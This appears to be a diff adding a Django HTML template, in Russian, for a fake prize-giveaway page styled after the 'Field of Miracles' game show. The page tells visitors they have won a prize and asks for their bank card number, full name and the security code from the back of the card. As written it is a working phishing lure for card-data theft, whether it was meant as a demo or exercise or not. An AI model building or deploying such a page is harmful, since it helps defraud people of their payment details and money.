@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Забери свой приз!</title>
+</head>
+<body>
+<h1>Поле чудес ОНЛАЙН!</h1>
+<p>Призы бесплатно, без СМС и регистрации за 5 МИНУТ!!!</p>
+
+<strong>Вы выиграли {{ prize }}!</strong>
+
+<p>Чтобы забрать приз, заполните форму ниже...</p>
+
+<form action="/" method="POST">
+    {% csrf_token %}
+    <strong>Номер банковской карточки: </strong>
+    <input type="key" name="number"><br><br>
+    <strong>Имя и фамилия: </strong>
+    <input type="name" name="name"><br><br>
+    <strong>Код безопасности на задней стороне: </strong>
+    <input type="key" name="key"><br><br>
+    <input type="submit" value="Получить приз!" />
+</form>
+</body>
+</html>
